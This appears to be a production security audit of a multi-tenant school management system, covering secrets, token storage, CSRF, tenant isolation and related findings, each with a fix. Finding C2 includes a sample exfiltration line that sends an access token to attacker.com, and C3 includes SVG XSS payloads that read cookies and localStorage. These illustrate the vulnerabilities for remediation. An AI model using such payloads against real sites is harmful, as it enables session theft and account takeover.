# Production Security Audit - LearnCloud School Management System
**Engineer:** Senior Cyber Security Engineer
**Date:** 2026-08-09 Africa/Harare
**Scope:** Authentication, Authorization, JWT, Refresh Tokens, Password Hashing, Password Reset, Email Verification, CSRF, XSS, SQL Injection, Rate Limiting, File Uploads, API Security, Secrets Management, Env Vars, Tenant Isolation, Privilege Escalation, Role Permissions, Session Management
**Verdict:** NOT READY FOR PRODUCTION - 5 Critical, 8 High, 10 Medium, 6 Low

---

## Critical (5) - Blocks Go-Live

### C1 - Hardcoded Secrets & Fallback Passwords in Code
**Where:**
- `src/LearnCloud.Auth/Extensions/AuthModuleExtensions.cs:32` fallback connection string `Server=localhost;Database=learncloud;User=root;Password=root;CharSet=utf8mb4;`
- `src/LearnCloud.OnlinePayments/Services/Gateways/PayNowGateway.cs:11-12` `IntegrationId = "demo-integration-id"` `IntegrationKey = "demo-integration-key-32-chars-min"`
- `src/LearnCloud.Messaging/Services/Providers/ConcreteProviders.cs:line` `ApiKey = "demo-key"`

**Why Critical:** If env vars missing, production defaults to demo keys and root/root DB. Git history will contain secrets if ever committed. PayNow demo keys would allow fake payments. Sms demo-key would fail but indicates pattern of demo secrets in prod code.
**Impact:** Complete compromise, payment bypass, data leak.
**Evidence:**
```csharp
public string IntegrationId { get; set; } = "demo-integration-id";
public string IntegrationKey { get; set; } = "demo-integration-key-32-chars-min";
```
**Fix:** Remove all defaults, throw if Jwt__Secret or PayNow keys missing. Use `IOptions` validation with `ValidateOnStart()`. No fallback connection string - require `ConnectionStrings__Default`. Scan repo with `gitleaks`.

### C2 - Access Token Stored in localStorage - XSS Leads to Tenant Takeover
**Where:** All Frontend `*.jsx` - `localStorage.getItem('access_token')` used 100+ times (grep count 100+), `src/LearnCloud.Web`, `TeacherPortal`, `ParentPortal`, `Fees`, `Attendance`, etc. Mobile uses `SecureStore` correctly.
**Why Critical:** Any XSS (e.g., via SVG logo upload, or via student name `<script>`) can exfiltrate `access_token` from localStorage via `fetch('https://attacker.com?token='+localStorage.getItem('access_token'))`. JWT contains tid, uid, roles, perms - attacker gains full tenant access. Parent portal least technical users often paste data leading to stored XSS.
**Impact:** Full tenant compromise, cross-tenant if token with tid mismatch not checked? Middleware checks mismatch and returns 403, but attacker can use token on same subdomain.
**Fix:** 
- Web: Store access token in memory (React state) + refresh via HttpOnly Secure SameSite=Strict cookie (already set). Do NOT return refresh token in body for web - only cookie. Implement `apiClient` with refresh queue, not localStorage.
- Add Content-Security-Policy header: `default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';` via Nginx or middleware.
- Sanitize all user inputs via HTML encoding, especially logo SVG (see C3).
- Mobile: Keep SecureStore (good).

### C3 - Stored XSS via SVG Logo Upload
**Where:** `SetupWizardController.cs:102-111` allows `.svg` extension, `WizardService.cs:257-265` saves original file stream directly to `wwwroot/uploads/{tenantId}/logo_{timestamp}{ext}` and serves via static files. SVG can contain `<script>alert(document.cookie)</script>` or `<image href="javascript:alert(localStorage.getItem('access_token'))">`. No content sanitization, no mime check, only extension check.
**Why Critical:** Stored XSS - every user visiting tenant branding sees malicious SVG, steals localStorage tokens (links to C2), defaces report cards / invoices that include logo. SVG is XML, can contain JS.
**Evidence:**
```csharp
var allowed = new[] { ".png", ".jpg", ".jpeg", ".svg" };
var ext = Path.GetExtension(file.FileName).ToLowerInvariant();
if (!allowed.Contains(ext)) return BadRequest(...);
...
var path = Path.Combine(uploadsDir,newName);
using var fs = new FileStream(path, FileMode.Create);
await fileStream.CopyToAsync(fs, ct);
```
No content validation, no antivirus, no SVG sanitization.
**Fix:**
- Disallow SVG for V1, only PNG/JPG (raster). If SVG required, sanitize via `SvgSanitizer` library removing script, onload, href javascript.
- Add content-type validation via file header magic bytes, not extension.
- Save outside wwwroot, serve via controller with `Content-Disposition: inline;` and `X-Content-Type-Options: nosniff`, not static.
- Add `Content-Security-Policy: ...` to prevent inline script in SVG? Still needed.
- Limit size 5MB okay but should be 2MB for logo.

### C4 - Missing Anti-CSRF for Refresh Cookie
**Where:** `AuthController.cs:66-80` refresh endpoint accepts token from cookie `Request.Cookies["refresh_token"]` AND body. Cookie is `HttpOnly Secure SameSite=Lax Path=/api/auth`. Lax allows top-level GET but not POST cross-site? Actually Lax blocks POST cross-site unless top-level navigation, but modern attack can use form POST from attacker.com to api.learncloud.co.zw/api/auth/refresh with cookie automatically sent, and if attacker can get refresh token via XSS (C2) they don't need CSRF, but if they can't get token, CSRF could be used to rotate tokens? More critical: Refresh endpoint does not validate anti-CSRF header.
**Why Critical:** If attacker tricks authenticated user to visit attacker.com with auto-form POST to refresh, cookie sent, attacker gets new access token in response? Response is JSON, not readable cross-origin if CORS blocks, but if CORS allows `*` (not configured), could read. Even if not read, rotation revokes old token causing DoS - user logged out.
**Fix:** 
- For cookie-based refresh, require `X-Requested-With: XMLHttpRequest` or custom header `X-CSRF-TOKEN` and validate via double-submit cookie pattern, or set SameSite=Strict (breaks some flows but more secure).
- Alternatively, do NOT accept cookie, only body (mobile) + add CSRF protection. Currently both accepted - pick one flow: Web = HttpOnly Strict cookie + CSRF token in header; Mobile = Bearer refresh in body.
- Add CORS policy explicit: `AllowCredentials` only for `https://*.learncloud.co.zw`, not `*`.

### C5 - Tenant Isolation Bypass via IsExplicitNoTenant (C3 from backend audit)
**Where:** `LearnCloudDbContext.cs:55-70` global query filter `e => !e.IsDeleted && (IsExplicitNoTenant || e.TenantId == CurrentTenantId)` and `IsExplicitNoTenant` set via `ITenantContext`. Privileged role check only in `INoTenantOperation`/`NoTenantScope`, not in DbContext SaveChanges. If any service sets `IsExplicitNoTenant=true` without role check (bug), it bypasses tenant filter returning all tenants data. No test for `IsExplicitNoTenant_WithoutRole_Throws`.
**Why Critical:** Could leak all schools, all students, fees - catastrophic for independent schools competitor leak.
**Impact:** Data breach across tenants.
**Fix:**
- Add `IModelCacheKeyFactory` that includes tenantId to prevent EF model cache poisoning.
- In DbContext, if `IsExplicitNoTenant`, require `Thread.CurrentPrincipal` has `PLATFORM_SUPERADMIN` role, else throw SecurityException, audit.
- Add integration tests: seed two tenants overlapping studentNumber, prove tenant A cannot read B via filter, and explicit no-tenant without role throws.
- Move AuditLog to not use tenant filter? Already excluded.

---

## High (8) - Must Fix Before Go-Live

### H1 - No CORS Policy Defined - Potential Wildcard
**Where:** `Program.cs` does not call `AddCors` or `UseCors`. Default may allow same origin only? But if no CORS configured, browser same-origin blocks cross-site fetch, good. However `appsettings` not shown, might have default allowing any? Need explicit.
**Fix:** Add CORS: `builder.Services.AddCors(o=>o.AddPolicy("tenant", p=>p.WithOrigins("https://*.learncloud.co.zw","https://learncloud.co.zw").AllowCredentials().AllowAnyMethod().AllowAnyHeader().WithExposedHeaders("X-Request-ID")));` and `app.UseCors("tenant")`.

### H2 - Missing Content-Security-Policy Header
**Where:** Nginx sets `X-Frame-Options SAMEORIGIN`, `X-Content-Type-Options nosniff`, `X-XSS-Protection` (deprecated), `Referrer-Policy`, `Permissions-Policy`, HSTS, but no CSP.
**Why High:** No CSP allows inline script, eval, etc. Combined with C2 localStorage + C3 SVG increases XSS impact.
**Fix:** Add CSP: `default-src 'self'; script-src 'self' https://cdn.tailwindcss.com https://unpkg.com; style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com; img-src 'self' data: https:; font-src 'self'; connect-src 'self' https://api.learncloud.co.zw; object-src 'none'; base-uri 'self'; frame-ancestors 'self';` Adjust for Vite dev.

### H3 - Rate Limiting Missing on Critical Endpoints
**Where:** Rate limiting only on `login` (5/m), `registration` (3/h), `password_reset` (3/h). Missing on `refresh` (could brute force refresh token hash), `verify-email`, `reset-password` (token guessing), `api/auth/me`, and all other `api/*` endpoints have Nginx `general 100r/m` but not app-level. No rate limit on `onlinePayments initiate` could cause fee abuse.
**Fix:** Add policies: `refresh 10/m per IP`, `verify-email 10/h`, `reset-password 5/h`, `general api 60/m per user` via authenticated partition (userId). Add `EnableRateLimiting("general")` on base controller.

### H4 - Password Hashing Uses PBKDF2 (Identity V3) Not Argon2id
**Where:** `PasswordHasher<User>` default Identity V3 = PBKDF2 HMACSHA256 100k iterations.
**Why High:** Modern best practice is Argon2id memory-hard, OWASP recommends Argon2id for new systems. PBKDF2 still acceptable but weaker against GPU.
**Fix:** Implement custom `IPasswordHasher` using `Konscious.Security.Cryptography.Argon2id`, migration path re-hash on successful login when old hash detected.

### H5 - JWT Secret Length Not Enforced At Startup, Weak HMAC-SHA256
**Where:** `JwtOptions.Secret` min 32 chars comment, but no validation. If secret = "demo-secret" 11 chars, HMAC weak, brute force.
**Fix:** Add `ValidateOnStart()` with `Secret.Length >= 32` and entropy check, require 256-bit (32 bytes). Consider RS256 with asymmetric key for microservices.

### H6 - File Upload Path Traversal & Content Type Spoofing
**Where:** `SetupWizardController` extension check only, `WizardService` uses `Path.GetExtension(fileName)` for final name, but `fileName` could be `../../evil.png`? Final `newName = logo_{timestamp}{ext}` mitigates traversal, but extension from original fileName could be `.png` but content is PHP or exe disguised. No magic byte check, no virus scan. `ContentType` from client trusted.
**Fix:** Validate MIME via header: read first bytes, ensure PNG 89 50 4E 47, JPG FF D8 FF, SVG should be sanitized if allowed. Generate random filename not based on user input (already does). Store outside webroot. Set `Content-Disposition`.

### H7 - Privilege Escalation via Role Assignment
**Where:** `AuthService.RegisterTenantAsync` assigns SCHOOL_ADMIN role by creating role if not exists and copying permissions `!p.Code.StartsWith("platform.") && !p.Code.StartsWith("tenants.")` - assigns all tenant perms to admin. But what about creating new roles via API? `HRController`, `FinanceController` etc check `Roles` attribute but not permission granularity for role creation - could SCHOOL_ADMIN create role with PLATFORM_SUPERADMIN? Need check.
**Evidence:** `SeedDefaultRoles.cs` not reviewed fully, but `UserRole` creation endpoint not seen - if exists, must prevent escalation to platform roles.
**Fix:** Add guard: Tenant cannot create role with code `PLATFORM_*`, `TENANTS_*`. Add `RoleHierarchy` check.

### H8 - Session Fixation & Concurrent Session Control Missing
**Where:** Refresh token family allows unlimited concurrent devices (good for parent portal), but no limit, no device tracking enforcement, no "logout all devices" except password change. No detection of impossible travel.
**Fix:** Add max active refresh families per user (e.g., 5), and endpoint `GET /api/auth/sessions` list active, `DELETE` revoke single. Add `Device` tracking logging IP + UserAgent, alert on new device.

---

## Medium (10)

### M1 - Insecure Direct Object Reference (IDOR) Potential
**Where:** Many endpoints take `studentId`, `gradeId` etc from query without verifying ownership beyond tenant filter. Example `OnlinePaymentsController.InitiateFromParent` gets guardianId via `GetGuardianIdAsync` which checks `g.UserId == UserId`, good. But `ParentPortal` `children/{studentId}/fees/statement` - does it verify guardian owns child via `GuardianStudentLink`? Need audit.
**Fix:** Add authorization service filter per resource: `IAuthorizationService.AuthorizeAsync(user, studentId, "OwnsStudent")`.

### M2 - Information Disclosure via Error Messages
**Where:** `AuthController` returns `ex.Message` from `InvalidOperationException` for slug taken, etc. `SubjectService` returns exception message directly. Could leak internal details.
**Fix:** Return generic messages for security exceptions, log details server-side, use `ProblemDetails`.

### M3 - No Security Headers for API - Missing X-Request-ID Correlation
**Where:** Nginx logs `tenant_slug` but no `X-Request-ID` generation, no structured logging correlation for audit.
**Fix:** Add middleware `X-Request-ID` GUID per request, log, return header.

### M4 - Email Verification & Password Reset Tokens Not Rate Limited Enough
**Where:** Tokens are single-use hashed, 24h/2h expiry good, but resend endpoint not seen rate limited - attacker could spam email verification to victim.
**Fix:** Add resend endpoint rate limit 3/h per email, same as password_reset.

### M5 - Swagger Enabled in Production? (Potential)
**Where:** `Program.cs` shows `if (app.Environment.IsDevelopment()) { app.UseSwagger(); }` - good check, but if `ASPNETCORE_ENVIRONMENT=Production` not set in some env, could expose swagger with endpoints.
**Fix:** Ensure `ASPNETCORE_ENVIRONMENT=Production` in docker-compose (already set), and disable swagger always in prod via config flag, not just env.

### M6 - Audit Logging of Sensitive Data
**Where:** `AuditLog` stores OldValues/NewValues as JSON, but need ensure password hash, tokens not logged. `FakeEmailSender` correctly redacts `[REDACTED]` but real sender might log token? Check.
**Fix:** Add `AuditInterceptor` filter to exclude `PasswordHash`, `TokenHash`, `SecurityStamp`.

### M7 - No Certificate Pinning for Mobile & No TLS Verification for PayNow Webhook
**Where:** Mobile `App.jsx` does `fetch` to API without cert pinning, PayNow webhook verification uses signature but does it validate TLS cert for PayNow pollurl? `PayNowGateway` likely uses HttpClient without custom validation - okay but should enforce TLS 1.2+.
**Fix:** Mobile add SSL pinning via `expo-ssl-pinning` or native, backend HttpClient `HttpClientHandler` with `SslProtocols = Tls12 | Tls13`.

### M8 - Backup Encryption Passphrase in Env - Need Rotation Policy
**Where:** `BACKUP_ENCRYPTION_PASSPHRASE` from env, good, but no rotation, no KMS.
**Fix:** Document rotation runbook, consider AWS KMS / Vault.

### M9 - No Web Application Firewall (WAF) Rules for SQL Injection / XSS
**Where:** EF Core prevents SQLi, but Nginx no WAF (e.g., ModSecurity) for common payloads.
**Fix:** Add ModSecurity OWASP CRS or at least Nginx `naxsi` for extra layer.

### M10 - Insecure Cookie Attributes for Refresh Token
**Where:** Refresh cookie `SameSite=Lax Path=/api/auth Secure HttpOnly` good, but missing `Domain` set to `.learncloud.co.zw`? Currently commented. Also missing `__Host-` prefix to prevent subdomain overwrite.
**Fix:** Use `__Host-refresh_token` name (requires Secure, Path=/, no Domain), SameSite=Strict for sensitive.

---

## Low (6)

### L1 - X-XSS-Protection Header Deprecated
**Where:** Nginx sets `X-XSS-Protection "1; mode=block"` - deprecated, can introduce vuln in old browsers.
**Fix:** Remove, rely on CSP.

### L2 - Disclosure of Stack Trace in 500
**Where:** Not seen, but default ASP.NET in Production hides stack, but need ensure `app.UseExceptionHandler`.
**Fix:** Add global exception handler returning generic 500 with request ID.

### L3 - No Subresource Integrity for CDN
**Where:** Marketing site uses `https://cdn.tailwindcss.com` and `https://unpkg.com/react@18/umd/react.production.min.js` without SRI.
**Fix:** Add `integrity` attribute or self-host.

### L4 - Password Policy Message Too Detailed (User Enumeration?)
**Where:** Lockout message `Account locked until {time}` reveals valid user vs invalid? Actually invalid returns same "Invalid credentials" but locked returns distinct message - could enumerate valid accounts via timing? Timing mitigation exists but message differs.
**Fix:** Return generic "Account locked, contact admin" without time, or same message for invalid vs locked but log time server-side.

### L5 - No HSTS Preload for Main Domain
**Where:** HSTS set `max-age=31536000; includeSubDomains; preload` - good includes preload, but need submission to hstspreload.org.
**Fix:** Submit.

### L6 - No Security.txt
**Where:** Missing `/.well-known/security.txt` for responsible disclosure.
**Fix:** Add file with contact.

---

## Summary Table

| ID | Severity | Title | Component | Effort |
|----|----------|-------|-----------|--------|
| C1 | Critical | Hardcoded demo secrets fallback | Auth, Payments, Messaging | 2h |
| C2 | Critical | access_token in localStorage XSS | All Frontend JSX | 4h |
| C3 | Critical | Stored XSS via SVG logo upload | SetupWizard | 3h |
| C4 | Critical | No CSRF for refresh cookie | Auth | 2h |
| C5 | Critical | Tenant isolation bypass IsExplicitNoTenant | MultiTenancy | 3h |
| H1 | High | No CORS policy | Api | 1h |
| H2 | High | No CSP header | Nginx/Api | 1h |
| H3 | High | Missing rate limits on refresh etc | Auth | 2h |
| H4 | High | PBKDF2 not Argon2id | Auth | 4h |
| H5 | High | JWT secret length not enforced | Auth | 1h |
| H6 | High | File upload content spoof | SetupWizard | 2h |
| H7 | High | Role escalation possible | Auth | 3h |
| H8 | High | Session fixation no device limit | Auth | 3h |
| M1-M10 | Medium | IDOR, error disclosure, etc | Various | 2-4h each |
| L1-L6 | Low | Deprecated headers, SRI, etc | Various | 1h each |

---

## Recommended Fix Order (One at a Time - No Rewrite)

Phase 0 Blocks Go-Live (Critical):
1. **C1 Hardcoded secrets** - remove defaults, fail fast, gitleaks
2. **C3 SVG XSS** - disallow SVG or sanitize, store outside wwwroot
3. **C2 localStorage token** - move to HttpOnly cookie + memory, add CSP, create apiClient
4. **C4 CSRF** - Strict SameSite + CSRF token for refresh
5. **C5 Tenant isolation** - Add role guard + IModelCacheKeyFactory + tests

Phase 1 High:
6. H2 CSP + H1 CORS
7. H3 Rate limiting
8. H5 JWT secret validation + H4 Argon2id (can be phased)
etc.

---

## Immediate Next Step

Fix **C1 - Hardcoded Secrets** first as it is trivial and blocks everything else.
